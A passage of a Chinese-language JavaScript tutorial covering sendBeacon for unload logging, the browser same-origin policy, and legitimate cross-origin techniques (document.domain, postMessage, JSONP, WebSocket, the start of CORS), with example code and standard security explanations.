<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML 代码如下</span><br><span class="line">&#x2F;&#x2F; &lt;a id&#x3D;&quot;target&quot; href&#x3D;&quot;https:&#x2F;&#x2F;baidu.com&quot;&gt;click&lt;&#x2F;a&gt;</span><br><span class="line">const clickTime &#x3D; 350;</span><br><span class="line">const theLink &#x3D; document.getElementById(&#39;target&#39;);</span><br><span class="line"></span><br><span class="line">function log() &#123;</span><br><span class="line">  let xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">  xhr.open(&#39;post&#39;, &#39;&#x2F;log&#39;, true);</span><br><span class="line">  xhr.setRequestHeader(&#39;Content-Type&#39;, &#39;application&#x2F;x-www-form-urlencoded&#39;);</span><br><span class="line">  xhr.send(&#39;foo&#x3D;bar&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">theLink.addEventListener(&#39;click&#39;, function (event) &#123;</span><br><span class="line">  event.preventDefault();</span><br><span class="line">  log();</span><br><span class="line"></span><br><span class="line">  setTimeout(function () &#123;</span><br><span class="line">    window.location.href &#x3D; theLink.getAttribute(&#39;href&#39;);</span><br><span class="line">  &#125;, clickTime);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码使用<code>setTimeout</code>，拖延了350毫秒，才让页面跳转，因此使得异步 AJAX 有时间发出。</p>
<p>这些做法的共同问题是，卸载的时间被硬生生拖长了，后面页面的加载被推迟了，用户体验不好。</p>
<p>为了解决这个问题，浏览器引入了<code>Navigator.sendBeacon()</code>方法。这个方法还是异步发出请求，但是请求与当前页面线程脱钩，作为浏览器进程的任务，因此可以保证会把数据发出去，不拖延卸载流程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&#39;unload&#39;, logData, false);</span><br><span class="line"></span><br><span class="line">function logData() &#123;</span><br><span class="line">  navigator.sendBeacon(&#39;&#x2F;log&#39;, analyticsData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Navigator.sendBeacon</code>方法接受两个参数，第一个参数是目标服务器的 URL，第二个参数是所要发送的数据（可选），可以是任意类型（字符串、表单对象、二进制对象等等）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.sendBeacon(url, data)</span><br></pre></td></tr></table></figure>

<p>这个方法的返回值是一个布尔值，成功发送数据为<code>true</code>，否则为<code>false</code>。</p>
<p>该方法发送数据的 HTTP 方法是 POST，可以跨域，类似于表单提交数据。它不能指定回调函数。</p>
<p>下面是一个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML 代码如下</span><br><span class="line">&#x2F;&#x2F; &lt;body onload&#x3D;&quot;analytics(&#39;start&#39;)&quot; onunload&#x3D;&quot;analytics(&#39;end&#39;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">function analytics(state) &#123;</span><br><span class="line">  if (!navigator.sendBeacon) return;</span><br><span class="line"></span><br><span class="line">  var URL &#x3D; &#39;http:&#x2F;&#x2F;example.com&#x2F;analytics&#39;;</span><br><span class="line">  var data &#x3D; &#39;state&#x3D;&#39; + state + &#39;&amp;location&#x3D;&#39; + window.location;</span><br><span class="line">  navigator.sendBeacon(URL, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="同源限制"><a href="#同源限制" class="headerlink" title="同源限制"></a>同源限制</h2><p>浏览器安全的基石是“同源政策”（<a href="https://en.wikipedia.org/wiki/Same-origin_policy" target="_blank" rel="noopener">same-origin policy</a>）。很多开发者都知道这一点，但了解得不全面。</p>
<h3 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h3><h4 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h4><p>1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。</p>
<p>最初，它的含义是指，A 网页设置的 Cookie，B 网页不能打开，除非这两个网页“同源”。所谓“同源”指的是“三个相同”。</p>
<blockquote>
<ul>
<li>协议相同</li>
<li>域名相同</li>
<li>端口相同（这点可以忽略，详见下文）</li>
</ul>
</blockquote>
<p>举例来说，<code>http://www.example.com/dir/page.html</code>这个网址，协议是<code>http://</code>，域名是<code>www.example.com</code>，端口是<code>80</code>（默认端口可以省略），它的同源情况如下。</p>
<ul>
<li><code>http://www.example.com/dir2/other.html</code>：同源</li>
<li><code>http://example.com/dir/other.html</code>：不同源（域名不同）</li>
<li><code>http://v2.www.example.com/dir/other.html</code>：不同源（域名不同）</li>
<li><code>http://www.example.com:81/dir/other.html</code>：不同源（端口不同）</li>
<li><code>https://www.example.com/dir/page.html</code>：不同源（协议不同）</li>
</ul>
<p>注意，标准规定端口不同的网址不是同源（比如8000端口和8001端口不是同源），但是浏览器没有遵守这条规定。实际上，同一个网域的不同端口，是可以互相读取 Cookie 的。</p>
<h4 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h4><p>同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。</p>
<p>设想这样一种情况：A 网站是一家银行，用户登录以后，A 网站在用户的机器上设置了一个 Cookie，包含了一些隐私信息。用户离开 A 网站以后，又去访问 B 网站，如果没有同源限制，B 网站可以读取 A 网站的 Cookie，那么隐私就泄漏了。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。</p>
<p>由此可见，同源政策是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。</p>
<h4 id="限制范围"><a href="#限制范围" class="headerlink" title="限制范围"></a>限制范围</h4><p>随着互联网的发展，同源政策越来越严格。目前，如果非同源，共有三种行为受到限制。</p>
<blockquote>
<p>（1） 无法读取非同源网页的 Cookie、LocalStorage 和 IndexedDB。</p>
<p>（2） 无法接触非同源网页的 DOM。</p>
<p>（3） 无法向非同源地址发送 AJAX 请求（可以发送，但浏览器会拒绝接受响应）。</p>
</blockquote>
<p>另外，通过 JavaScript 脚本可以拿到其他窗口的<code>window</code>对象。如果是非同源的网页，目前允许一个窗口可以接触其他网页的<code>window</code>对象的九个属性和四个方法。</p>
<ul>
<li>window.closed</li>
<li>window.frames</li>
<li>window.length</li>
<li>window.location</li>
<li>window.opener</li>
<li>window.parent</li>
<li>window.self</li>
<li>window.top</li>
<li>window.window</li>
<li>window.blur()</li>
<li>window.close()</li>
<li>window.focus()</li>
<li>window.postMessage()</li>
</ul>
<p>上面的九个属性之中，只有<code>window.location</code>是可读写的，其他八个全部都是只读。而且，即使是<code>location</code>对象，非同源的情况下，也只允许调用<code>location.replace()</code>方法和写入<code>location.href</code>属性。</p>
<p>虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。下面介绍如何规避上面的限制。</p>
<h3 id="Cookie-1"><a href="#Cookie-1" class="headerlink" title="Cookie"></a>Cookie</h3><p>Cookie 是服务器写入浏览器的一小段信息，只有同源的网页才能共享。如果两个网页一级域名相同，只是次级域名不同，浏览器允许通过设置<code>document.domain</code>共享 Cookie。</p>
<p>举例来说，A 网页的网址是<code>http://w1.example.com/a.html</code>，B 网页的网址是<code>http://w2.example.com/b.html</code>，那么只要设置相同的<code>document.domain</code>，两个网页就可以共享 Cookie。因为浏览器通过<code>document.domain</code>属性来检查是否同源。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 两个网页都需要设置</span><br><span class="line">document.domain &#x3D; &#39;example.com&#39;;</span><br></pre></td></tr></table></figure>

<p>注意，A 和 B 两个网页都需要设置<code>document.domain</code>属性，才能达到同源的目的。因为设置<code>document.domain</code>的同时，会把端口重置为<code>null</code>，因此如果只设置一个网页的<code>document.domain</code>，会导致两个网址的端口不同，还是达不到同源的目的。</p>
<p>现在，A 网页通过脚本设置一个 Cookie。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x3D; &quot;test1&#x3D;hello&quot;;</span><br></pre></td></tr></table></figure>

<p>B 网页就可以读到这个 Cookie。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var allCookie &#x3D; document.cookie;</span><br></pre></td></tr></table></figure>

<p>注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexedDB 无法通过这种方法，规避同源政策，而要使用下文介绍 PostMessage API。</p>
<p>另外，服务器也可以在设置 Cookie 的时候，指定 Cookie 的所属域名为一级域名，比如<code>example.com</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key&#x3D;value; domain&#x3D;example.com; path&#x3D;&#x2F;</span><br></pre></td></tr></table></figure>

<p>这样的话，二级域名和三级域名不用做任何设置，都可以读取这个 Cookie。</p>
<h3 id="iframe-和多窗口通信"><a href="#iframe-和多窗口通信" class="headerlink" title="iframe 和多窗口通信"></a>iframe 和多窗口通信</h3><p><code>iframe</code>元素可以在当前网页之中，嵌入其他网页。每个<code>iframe</code>元素形成自己的窗口，即有自己的<code>window</code>对象。<code>iframe</code>窗口之中的脚本，可以获得父窗口和子窗口。但是，只有在同源的情况下，父窗口和子窗口才能通信；如果跨域，就无法拿到对方的 DOM。</p>
<p>比如，父窗口运行下面的命令，如果<code>iframe</code>窗口不是同源，就会报错。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">document</span><br><span class="line">.getElementById(&quot;myIFrame&quot;)</span><br><span class="line">.contentWindow</span><br><span class="line">.document</span><br><span class="line">&#x2F;&#x2F; Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.</span><br></pre></td></tr></table></figure>

<p>上面命令中，父窗口想获取子窗口的 DOM，因为跨域导致报错。</p>
<p>反之亦然，子窗口获取主窗口的 DOM 也会报错。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.parent.document.body</span><br><span class="line">&#x2F;&#x2F; 报错</span><br></pre></td></tr></table></figure>

<p>这种情况不仅适用于<code>iframe</code>窗口，还适用于<code>window.open</code>方法打开的窗口，只要跨域，父窗口与子窗口之间就无法通信。</p>
<p>如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的<code>document.domain</code>属性，就可以规避同源政策，拿到 DOM。</p>
<p>对于完全不同源的网站，目前有两种方法，可以解决跨域窗口的通信问题。</p>
<blockquote>
<ul>
<li>片段识别符（fragment identifier）</li>
<li>跨文档通信API（Cross-document messaging）</li>
</ul>
</blockquote>
<h4 id="片段识别符"><a href="#片段识别符" class="headerlink" title="片段识别符"></a>片段识别符</h4><p>片段标识符（fragment identifier）指的是，URL 的<code>#</code>号后面的部分，比如<code>http://example.com/x.html#fragment</code>的<code>#fragment</code>。如果只是改变片段标识符，页面不会重新刷新。</p>
<p>父窗口可以把信息，写入子窗口的片段标识符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var src &#x3D; originURL + &#39;#&#39; + data;</span><br><span class="line">document.getElementById(&#39;myIFrame&#39;).src &#x3D; src;</span><br></pre></td></tr></table></figure>

<p>上面代码中，父窗口把所要传递的信息，写入 iframe 窗口的片段标识符。</p>
<p>子窗口通过监听<code>hashchange</code>事件得到通知。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">window.onhashchange &#x3D; checkMessage;</span><br><span class="line"></span><br><span class="line">function checkMessage() &#123;</span><br><span class="line">  var message &#x3D; window.location.hash;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样的，子窗口也可以改变父窗口的片段标识符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parent.location.href &#x3D; target + &#39;#&#39; + hash;</span><br></pre></td></tr></table></figure>

<h4 id="window-postMessage"><a href="#window-postMessage" class="headerlink" title="window.postMessage()"></a>window.postMessage()</h4><p>上面的这种方法属于破解，HTML5 为了解决这个问题，引入了一个全新的API：跨文档通信 API（Cross-document messaging）。</p>
<p>这个 API 为<code>window</code>对象新增了一个<code>window.postMessage</code>方法，允许跨窗口通信，不论这两个窗口是否同源。举例来说，父窗口<code>aaa.com</code>向子窗口<code>bbb.com</code>发消息，调用<code>postMessage</code>方法就可以了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 父窗口打开一个子窗口</span><br><span class="line">var popup &#x3D; window.open(&#39;http:&#x2F;&#x2F;bbb.com&#39;, &#39;title&#39;);</span><br><span class="line">&#x2F;&#x2F; 父窗口向子窗口发消息</span><br><span class="line">popup.postMessage(&#39;Hello World!&#39;, &#39;http:&#x2F;&#x2F;bbb.com&#39;);</span><br></pre></td></tr></table></figure>

<p><code>postMessage</code>方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即“协议 + 域名 + 端口”。也可以设为<code>*</code>，表示不限制域名，向所有窗口发送。</p>
<p>子窗口向父窗口发送消息的写法类似。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 子窗口向父窗口发消息</span><br><span class="line">window.opener.postMessage(&#39;Nice to see you&#39;, &#39;http:&#x2F;&#x2F;aaa.com&#39;);</span><br></pre></td></tr></table></figure>

<p>父窗口和子窗口都可以通过<code>message</code>事件，监听对方的消息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 父窗口和子窗口都可以用下面的代码，</span><br><span class="line">&#x2F;&#x2F; 监听 message 消息</span><br><span class="line">window.addEventListener(&#39;message&#39;, function (e) &#123;</span><br><span class="line">  console.log(e.data);</span><br><span class="line">&#125;,false);</span><br></pre></td></tr></table></figure>

<p><code>message</code>事件的参数是事件对象<code>event</code>，提供以下三个属性。</p>
<blockquote>
<ul>
<li><code>event.source</code>：发送消息的窗口</li>
<li><code>event.origin</code>: 消息发向的网址</li>
<li><code>event.data</code>: 消息内容</li>
</ul>
</blockquote>
<p>下面的例子是，子窗口通过<code>event.source</code>属性引用父窗口，然后发送消息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&#39;message&#39;, receiveMessage);</span><br><span class="line">function receiveMessage(event) &#123;</span><br><span class="line">  event.source.postMessage(&#39;Nice to see you!&#39;, &#39;*&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码有几个地方需要注意。首先，<code>receiveMessage</code>函数里面没有过滤信息的来源，任意网址发来的信息都会被处理。其次，<code>postMessage</code>方法中指定的目标窗口的网址是一个星号，表示该信息可以向任意网址发送。通常来说，这两种做法是不推荐的，因为不够安全，可能会被恶意利用。</p>
<p><code>event.origin</code>属性可以过滤不是发给本窗口的消息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&#39;message&#39;, receiveMessage);</span><br><span class="line">function receiveMessage(event) &#123;</span><br><span class="line">  if (event.origin !&#x3D;&#x3D; &#39;http:&#x2F;&#x2F;aaa.com&#39;) return;</span><br><span class="line">  if (event.data &#x3D;&#x3D;&#x3D; &#39;Hello World&#39;) &#123;</span><br><span class="line">    event.source.postMessage(&#39;Hello&#39;, event.origin);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    console.log(event.data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="LocalStorage"><a href="#LocalStorage" class="headerlink" title="LocalStorage"></a>LocalStorage</h4><p>通过<code>window.postMessage</code>，读写其他窗口的 LocalStorage 也成为了可能。</p>
<p>下面是一个例子，主窗口写入 iframe 子窗口的<code>localStorage</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">window.onmessage &#x3D; function(e) &#123;</span><br><span class="line">  if (e.origin !&#x3D;&#x3D; &#39;http:&#x2F;&#x2F;bbb.com&#39;) &#123;</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  var payload &#x3D; JSON.parse(e.data);</span><br><span class="line">  localStorage.setItem(payload.key, JSON.stringify(payload.data));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面代码中，子窗口将父窗口发来的消息，写入自己的 LocalStorage。</p>
<p>父窗口发送消息的代码如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var win &#x3D; document.getElementsByTagName(&#39;iframe&#39;)[0].contentWindow;</span><br><span class="line">var obj &#x3D; &#123; name: &#39;Jack&#39; &#125;;</span><br><span class="line">win.postMessage(</span><br><span class="line">  JSON.stringify(&#123;key: &#39;storage&#39;, data: obj&#125;),</span><br><span class="line">  &#39;http:&#x2F;&#x2F;bbb.com&#39;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>加强版的子窗口接收消息的代码如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">window.onmessage &#x3D; function(e) &#123;</span><br><span class="line">  if (e.origin !&#x3D;&#x3D; &#39;http:&#x2F;&#x2F;bbb.com&#39;) return;</span><br><span class="line">  var payload &#x3D; JSON.parse(e.data);</span><br><span class="line">  switch (payload.method) &#123;</span><br><span class="line">    case &#39;set&#39;:</span><br><span class="line">      localStorage.setItem(payload.key, JSON.stringify(payload.data));</span><br><span class="line">      break;</span><br><span class="line">    case &#39;get&#39;:</span><br><span class="line">      var parent &#x3D; window.parent;</span><br><span class="line">      var data &#x3D; localStorage.getItem(payload.key);</span><br><span class="line">      parent.postMessage(data, &#39;http:&#x2F;&#x2F;aaa.com&#39;);</span><br><span class="line">      break;</span><br><span class="line">    case &#39;remove&#39;:</span><br><span class="line">      localStorage.removeItem(payload.key);</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>加强版的父窗口发送消息代码如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var win &#x3D; document.getElementsByTagName(&#39;iframe&#39;)[0].contentWindow;</span><br><span class="line">var obj &#x3D; &#123; name: &#39;Jack&#39; &#125;;</span><br><span class="line">&#x2F;&#x2F; 存入对象</span><br><span class="line">win.postMessage(</span><br><span class="line">  JSON.stringify(&#123;key: &#39;storage&#39;, method: &#39;set&#39;, data: obj&#125;),</span><br><span class="line">  &#39;http:&#x2F;&#x2F;bbb.com&#39;</span><br><span class="line">);</span><br><span class="line">&#x2F;&#x2F; 读取对象</span><br><span class="line">win.postMessage(</span><br><span class="line">  JSON.stringify(&#123;key: &#39;storage&#39;, method: &quot;get&quot;&#125;),</span><br><span class="line">  &quot;*&quot;</span><br><span class="line">);</span><br><span class="line">window.onmessage &#x3D; function(e) &#123;</span><br><span class="line">  if (e.origin !&#x3D; &#39;http:&#x2F;&#x2F;aaa.com&#39;) return;</span><br><span class="line">  console.log(JSON.parse(e.data).name);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h3><p>同源政策规定，AJAX 请求只能发给同源的网址，否则就报错。</p>
<p>除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。</p>
<blockquote>
<ul>
<li>JSONP</li>
<li>WebSocket</li>
<li>CORS</li>
</ul>
</blockquote>
<h4 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h4><p>JSONP 是服务器与客户端跨源通信的常用方法。最大特点就是简单易用，没有兼容性问题，老式浏览器全部支持，服务端改造非常小。</p>
<p>它的做法如下。</p>
<p>第一步，网页添加一个<code>&lt;script&gt;</code>元素，向服务器请求一个脚本，这不受同源政策限制，可以跨域请求。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;api.foo.com?callback&#x3D;bar&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>注意，请求的脚本网址有一个<code>callback</code>参数（<code>?callback=bar</code>），用来告诉服务器，客户端的回调函数名称（<code>bar</code>）。</p>
<p>第二步，服务器收到请求后，拼接一个字符串，将 JSON 数据放在函数名里面，作为字符串返回（<code>bar({...})</code>）。</p>
<p>第三步，客户端会将服务器返回的字符串，作为代码解析，因为浏览器认为，这是<code>&lt;script&gt;</code>标签请求的脚本内容。这时，客户端只要定义了<code>bar()</code>函数，就能在该函数体内，拿到服务器返回的 JSON 数据。</p>
<p>下面看一个实例。首先，网页动态插入<code>&lt;script&gt;</code>元素，由它向跨域网址发出请求。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function addScriptTag(src) &#123;</span><br><span class="line">  var script &#x3D; document.createElement(&#39;script&#39;);</span><br><span class="line">  script.setAttribute(&#39;type&#39;, &#39;text&#x2F;javascript&#39;);</span><br><span class="line">  script.src &#x3D; src;</span><br><span class="line">  document.body.appendChild(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">window.onload &#x3D; function () &#123;</span><br><span class="line">  addScriptTag(&#39;http:&#x2F;&#x2F;example.com&#x2F;ip?callback&#x3D;foo&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function foo(data) &#123;</span><br><span class="line">  console.log(&#39;Your public IP address is: &#39; + data.ip);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面代码通过动态添加<code>&lt;script&gt;</code>元素，向服务器<code>example.com</code>发出请求。注意，该请求的查询字符串有一个<code>callback</code>参数，用来指定回调函数的名字，这对于 JSONP 是必需的。</p>
<p>服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foo(&#123;</span><br><span class="line">  &#39;ip&#39;: &#39;8.8.8.8&#39;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>由于<code>&lt;script&gt;</code>元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了<code>foo</code>函数，该函数就会立即调用。作为参数的 JSON 数据被视为 JavaScript 对象，而不是字符串，因此避免了使用<code>JSON.parse</code>的步骤。</p>
<h4 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h4><p>WebSocket 是一种通信协议，使用<code>ws://</code>（非加密）和<code>wss://</code>（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。</p>
<p>下面是一个例子，浏览器发出的 WebSocket 请求的头信息（摘自<a href="https://en.wikipedia.org/wiki/WebSocket" target="_blank" rel="noopener">维基百科</a>）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;chat HTTP&#x2F;1.1</span><br><span class="line">Host: server.example.com</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw&#x3D;&#x3D;</span><br><span class="line">Sec-WebSocket-Protocol: chat, superchat</span><br><span class="line">Sec-WebSocket-Version: 13</span><br><span class="line">Origin: http:&#x2F;&#x2F;example.com</span><br></pre></td></tr></table></figure>

<p>上面代码中，有一个字段是<code>Origin</code>，表示该请求的请求源（origin），即发自哪个域名。</p>
<p>正是因为有了<code>Origin</code>这个字段，所以 WebSocket 才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 101 Switching Protocols</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk&#x3D;</span><br><span class="line">Sec-WebSocket-Protocol: chat</span><br></pre></td></tr></table></figure>

<h4 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h4><p>CORS 是跨源资源分享（Cross-Origin Resource Sharing）的缩写。它是 W3C 标准，属于跨源 AJAX 请求的根本解决方法。相比 JSONP 只能发<code>GET</code>请求，CORS 允许任何类型的请求。</p>
<h2 id="CORS-通信"><a href="#CORS-通信" class="headerlink" title="CORS 通信"></a>CORS 通信</h2><p>CORS 是一个 W3C 标准，全称是“跨域资源共享”（Cross-origin resource sharing）。它允许浏览器向跨域的服务器，发出<code>XMLHttpRequest</code>请求，从而克服了 AJAX 只能同源使用的限制。</p>
<h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能。</p>
<p>整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与普通的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨域，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感知。因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨域通信。</p>
<h3 id="两种请求"><a href="#两种请求" class="headerlink" title="两种请求"></a>两种请求</h3><p>CORS 请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p>
<p>只要同时满足以下两大条件，就属于简单请求。</p>
<p>（1）请求方法是以下三种方法之一。</p>
<blockquote>
<ul>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ul>
</blockquote>
<p>（2）HTTP 的头信息不超出以下几种字段。</p>
<blockquote>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Last-Event-ID</li>
<li>Content-Type：只限于三个值<code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code></li>
</ul>
</blockquote>
